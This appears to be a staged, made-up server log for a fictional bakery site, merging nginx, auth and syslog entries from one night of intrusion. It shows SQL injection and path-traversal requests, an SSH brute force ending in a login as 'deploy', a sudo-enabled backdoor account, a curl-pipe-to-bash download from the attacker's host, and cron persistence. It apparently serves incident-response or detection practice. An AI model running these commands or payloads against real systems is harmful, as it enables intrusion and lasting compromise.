@@ -1,0 +1,107 @@
+# maple-lane-web: one night of nginx access.log, auth.log and syslog, merged in time order
+# Staged example: Maple Lane Bakery is made up, and every IP is from the RFC 5737 documentation ranges.
+198.51.100.23 - - [05/Oct/2026:00:58:11 +0000] "GET / HTTP/1.1" 200 5312 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+198.51.100.23 - - [05/Oct/2026:00:58:14 +0000] "GET /menu HTTP/1.1" 200 8821 "-" "Mozilla/5.0"
+203.0.113.47 - - [05/Oct/2026:01:02:03 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+203.0.113.47 - - [05/Oct/2026:01:02:03 +0000] "GET /.git/config HTTP/1.1" 404 153 "-" "sqlmap/1.7-dev"
+203.0.113.47 - - [05/Oct/2026:01:02:04 +0000] "GET /wp-login.php HTTP/1.1" 404 153 "-" "sqlmap/1.7-dev"
+203.0.113.47 - - [05/Oct/2026:01:02:05 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 153 "-" "sqlmap/1.7-dev"
+203.0.113.47 - - [05/Oct/2026:01:02:06 +0000] "GET /admin/config.php HTTP/1.1" 404 153 "-" "sqlmap/1.7-dev"
+203.0.113.47 - - [05/Oct/2026:01:03:11 +0000] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 512 "-" "sqlmap/1.7-dev"
+203.0.113.47 - - [05/Oct/2026:01:03:12 +0000] "GET /products?id=1'%20OR%20'1'='1 HTTP/1.1" 200 8821 "-" "sqlmap/1.7-dev"
+203.0.113.47 - - [05/Oct/2026:01:03:30 +0000] "GET /order?file=../../../../etc/passwd HTTP/1.1" 403 153 "-" "sqlmap/1.7-dev"
+203.0.113.47 - - [05/Oct/2026:01:03:34 +0000] "GET /static/%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1" 403 153 "-" "sqlmap/1.7-dev"
+Oct  5 01:05:01 maple-lane-web sshd[20001]: Failed password for invalid user admin from 203.0.113.47 port 40001 ssh2
+Oct  5 01:05:02 maple-lane-web sshd[20002]: Failed password for invalid user admin from 203.0.113.47 port 40002 ssh2
+Oct  5 01:05:03 maple-lane-web sshd[20003]: Failed password for invalid user admin from 203.0.113.47 port 40003 ssh2
+Oct  5 01:05:04 maple-lane-web sshd[20004]: Failed password for invalid user admin from 203.0.113.47 port 40004 ssh2
+Oct  5 01:05:05 maple-lane-web sshd[20005]: Failed password for invalid user admin from 203.0.113.47 port 40005 ssh2
+Oct  5 01:05:06 maple-lane-web sshd[20006]: Failed password for invalid user admin from 203.0.113.47 port 40006 ssh2
+Oct  5 01:05:07 maple-lane-web sshd[20007]: Failed password for invalid user admin from 203.0.113.47 port 40007 ssh2
+Oct  5 01:05:08 maple-lane-web sshd[20008]: Failed password for invalid user admin from 203.0.113.47 port 40008 ssh2
+Oct  5 01:05:09 maple-lane-web sshd[20009]: Failed password for invalid user admin from 203.0.113.47 port 40009 ssh2
+Oct  5 01:05:10 maple-lane-web sshd[20010]: Failed password for invalid user admin from 203.0.113.47 port 40010 ssh2
+Oct  5 01:05:11 maple-lane-web sshd[20011]: Failed password for invalid user admin from 203.0.113.47 port 40011 ssh2
+Oct  5 01:06:12 maple-lane-web sshd[20012]: Failed password for invalid user admin from 203.0.113.47 port 40012 ssh2
+Oct  5 01:06:13 maple-lane-web sshd[20013]: Failed password for invalid user admin from 203.0.113.47 port 40013 ssh2
+Oct  5 01:06:14 maple-lane-web sshd[20014]: Failed password for invalid user admin from 203.0.113.47 port 40014 ssh2
+Oct  5 01:06:15 maple-lane-web sshd[20015]: Failed password for invalid user admin from 203.0.113.47 port 40015 ssh2
+Oct  5 01:06:16 maple-lane-web sshd[20016]: Failed password for invalid user admin from 203.0.113.47 port 40016 ssh2
+Oct  5 01:06:17 maple-lane-web sshd[20017]: Failed password for invalid user admin from 203.0.113.47 port 40017 ssh2
+Oct  5 01:06:18 maple-lane-web sshd[20018]: Failed password for invalid user admin from 203.0.113.47 port 40018 ssh2
+Oct  5 01:06:19 maple-lane-web sshd[20019]: Failed password for invalid user admin from 203.0.113.47 port 40019 ssh2
+Oct  5 01:06:20 maple-lane-web sshd[20020]: Failed password for invalid user admin from 203.0.113.47 port 40020 ssh2
+Oct  5 01:06:21 maple-lane-web sshd[20021]: Failed password for invalid user admin from 203.0.113.47 port 40021 ssh2
+Oct  5 01:06:22 maple-lane-web sshd[20022]: Failed password for invalid user admin from 203.0.113.47 port 40022 ssh2
+Oct  5 01:06:23 maple-lane-web sshd[20023]: Failed password for invalid user admin from 203.0.113.47 port 40023 ssh2
+Oct  5 01:07:24 maple-lane-web sshd[20024]: Failed password for invalid user admin from 203.0.113.47 port 40024 ssh2
+Oct  5 01:07:25 maple-lane-web sshd[20025]: Failed password for invalid user admin from 203.0.113.47 port 40025 ssh2
+Oct  5 01:07:26 maple-lane-web sshd[20026]: Failed password for invalid user admin from 203.0.113.47 port 40026 ssh2
+Oct  5 01:07:27 maple-lane-web sshd[20027]: Failed password for invalid user admin from 203.0.113.47 port 40027 ssh2
+Oct  5 01:07:28 maple-lane-web sshd[20028]: Failed password for invalid user admin from 203.0.113.47 port 40028 ssh2
+Oct  5 01:07:29 maple-lane-web sshd[20029]: Failed password for invalid user admin from 203.0.113.47 port 40029 ssh2
+Oct  5 01:07:30 maple-lane-web sshd[20030]: Failed password for invalid user admin from 203.0.113.47 port 40030 ssh2
+Oct  5 01:07:31 maple-lane-web sshd[20031]: Failed password for invalid user admin from 203.0.113.47 port 40031 ssh2
+Oct  5 01:07:32 maple-lane-web sshd[20032]: Failed password for invalid user admin from 203.0.113.47 port 40032 ssh2
+Oct  5 01:07:33 maple-lane-web sshd[20033]: Failed password for invalid user admin from 203.0.113.47 port 40033 ssh2
+Oct  5 01:07:34 maple-lane-web sshd[20034]: Failed password for invalid user admin from 203.0.113.47 port 40034 ssh2
+Oct  5 01:07:35 maple-lane-web sshd[20035]: Failed password for invalid user admin from 203.0.113.47 port 40035 ssh2
+Oct  5 01:08:36 maple-lane-web sshd[20036]: Failed password for invalid user admin from 203.0.113.47 port 40036 ssh2
+Oct  5 01:08:37 maple-lane-web sshd[20037]: Failed password for invalid user admin from 203.0.113.47 port 40037 ssh2
+Oct  5 01:08:38 maple-lane-web sshd[20038]: Failed password for invalid user admin from 203.0.113.47 port 40038 ssh2
+Oct  5 01:08:39 maple-lane-web sshd[20039]: Failed password for invalid user admin from 203.0.113.47 port 40039 ssh2
+Oct  5 01:08:40 maple-lane-web sshd[20040]: Failed password for invalid user admin from 203.0.113.47 port 40040 ssh2
+Oct  5 01:08:41 maple-lane-web sshd[20041]: Failed password for invalid user admin from 203.0.113.47 port 40041 ssh2
+Oct  5 01:08:42 maple-lane-web sshd[20042]: Failed password for invalid user admin from 203.0.113.47 port 40042 ssh2
+Oct  5 01:08:43 maple-lane-web sshd[20043]: Failed password for invalid user admin from 203.0.113.47 port 40043 ssh2
+Oct  5 01:08:44 maple-lane-web sshd[20044]: Failed password for invalid user admin from 203.0.113.47 port 40044 ssh2
+Oct  5 01:08:45 maple-lane-web sshd[20045]: Failed password for invalid user admin from 203.0.113.47 port 40045 ssh2
+Oct  5 01:08:46 maple-lane-web sshd[20046]: Failed password for invalid user admin from 203.0.113.47 port 40046 ssh2
+Oct  5 01:08:47 maple-lane-web sshd[20047]: Failed password for invalid user admin from 203.0.113.47 port 40047 ssh2
+Oct  5 01:09:48 maple-lane-web sshd[20048]: Failed password for invalid user admin from 203.0.113.47 port 40048 ssh2
+Oct  5 01:09:49 maple-lane-web sshd[20049]: Failed password for invalid user admin from 203.0.113.47 port 40049 ssh2
+Oct  5 01:09:50 maple-lane-web sshd[20050]: Failed password for invalid user admin from 203.0.113.47 port 40050 ssh2
+Oct  5 01:09:51 maple-lane-web sshd[20051]: Failed password for invalid user admin from 203.0.113.47 port 40051 ssh2
+Oct  5 01:09:52 maple-lane-web sshd[20052]: Failed password for invalid user admin from 203.0.113.47 port 40052 ssh2
+Oct  5 01:09:53 maple-lane-web sshd[20053]: Failed password for invalid user admin from 203.0.113.47 port 40053 ssh2
+Oct  5 01:09:54 maple-lane-web sshd[20054]: Failed password for invalid user admin from 203.0.113.47 port 40054 ssh2
+Oct  5 01:09:55 maple-lane-web sshd[20055]: Failed password for invalid user admin from 203.0.113.47 port 40055 ssh2
+Oct  5 01:09:56 maple-lane-web sshd[20056]: Failed password for invalid user admin from 203.0.113.47 port 40056 ssh2
+Oct  5 01:09:57 maple-lane-web sshd[20057]: Failed password for invalid user admin from 203.0.113.47 port 40057 ssh2
+Oct  5 01:09:58 maple-lane-web sshd[20058]: Failed password for invalid user admin from 203.0.113.47 port 40058 ssh2
+Oct  5 01:09:59 maple-lane-web sshd[20059]: Failed password for invalid user admin from 203.0.113.47 port 40059 ssh2
+Oct  5 01:10:00 maple-lane-web sshd[20060]: Failed password for invalid user admin from 203.0.113.47 port 40060 ssh2
+Oct  5 01:11:01 maple-lane-web sshd[21001]: Failed password for deploy from 203.0.113.47 port 41001 ssh2
+Oct  5 01:11:02 maple-lane-web sshd[21002]: Failed password for deploy from 203.0.113.47 port 41002 ssh2
+Oct  5 01:11:03 maple-lane-web sshd[21003]: Failed password for deploy from 203.0.113.47 port 41003 ssh2
+Oct  5 01:11:04 maple-lane-web sshd[21004]: Failed password for deploy from 203.0.113.47 port 41004 ssh2
+Oct  5 01:11:05 maple-lane-web sshd[21005]: Failed password for deploy from 203.0.113.47 port 41005 ssh2
+Oct  5 01:11:06 maple-lane-web sshd[21006]: Failed password for deploy from 203.0.113.47 port 41006 ssh2
+Oct  5 01:11:07 maple-lane-web sshd[21007]: Failed password for deploy from 203.0.113.47 port 41007 ssh2
+Oct  5 01:11:08 maple-lane-web sshd[21008]: Failed password for deploy from 203.0.113.47 port 41008 ssh2
+Oct  5 01:11:09 maple-lane-web sshd[21009]: Failed password for deploy from 203.0.113.47 port 41009 ssh2
+Oct  5 01:11:10 maple-lane-web sshd[21010]: Failed password for deploy from 203.0.113.47 port 41010 ssh2
+Oct  5 01:11:11 maple-lane-web sshd[21011]: Failed password for deploy from 203.0.113.47 port 41011 ssh2
+Oct  5 01:12:12 maple-lane-web sshd[21012]: Failed password for deploy from 203.0.113.47 port 41012 ssh2
+Oct  5 01:12:13 maple-lane-web sshd[21013]: Failed password for deploy from 203.0.113.47 port 41013 ssh2
+Oct  5 01:12:14 maple-lane-web sshd[21014]: Failed password for deploy from 203.0.113.47 port 41014 ssh2
+Oct  5 01:12:15 maple-lane-web sshd[21015]: Failed password for deploy from 203.0.113.47 port 41015 ssh2
+Oct  5 01:12:16 maple-lane-web sshd[21016]: Failed password for deploy from 203.0.113.47 port 41016 ssh2
+Oct  5 01:12:17 maple-lane-web sshd[21017]: Failed password for deploy from 203.0.113.47 port 41017 ssh2
+Oct  5 01:12:18 maple-lane-web sshd[21018]: Failed password for deploy from 203.0.113.47 port 41018 ssh2
+Oct  5 01:12:19 maple-lane-web sshd[21019]: Failed password for deploy from 203.0.113.47 port 41019 ssh2
+Oct  5 01:12:20 maple-lane-web sshd[21020]: Failed password for deploy from 203.0.113.47 port 41020 ssh2
+Oct  5 01:12:21 maple-lane-web sshd[21021]: Failed password for deploy from 203.0.113.47 port 41021 ssh2
+Oct  5 01:12:22 maple-lane-web sshd[21022]: Failed password for deploy from 203.0.113.47 port 41022 ssh2
+Oct  5 01:12:23 maple-lane-web sshd[21023]: Failed password for deploy from 203.0.113.47 port 41023 ssh2
+Oct  5 01:13:24 maple-lane-web sshd[21024]: Failed password for deploy from 203.0.113.47 port 41024 ssh2
+Oct  5 01:13:25 maple-lane-web sshd[21025]: Failed password for deploy from 203.0.113.47 port 41025 ssh2
+Oct  5 01:13:58 maple-lane-web sshd[21777]: Accepted password for deploy from 203.0.113.47 port 41999 ssh2
+Oct  5 01:14:02 maple-lane-web sshd[21777]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Oct  5 01:14:40 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup
+Oct  5 01:14:41 maple-lane-web useradd[21990]: new user: name=svc-backup, UID=1004, GID=1004, home=/home/svc-backup, shell=/bin/bash
+Oct  5 01:14:55 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup
+Oct  5 01:15:20 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c curl -fsSL http://203.0.113.47/x/update.sh | bash
+Oct  5 01:15:40 maple-lane-web crontab[22044]: (deploy) REPLACE (deploy)
+Oct  5 01:16:03 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/update
+198.51.100.76 - - [05/Oct/2026:01:21:09 +0000] "POST /reserve HTTP/1.1" 200 712 "https://maple-lane-bakery.example/menu" "Mozilla/5.0 (iPhone)"
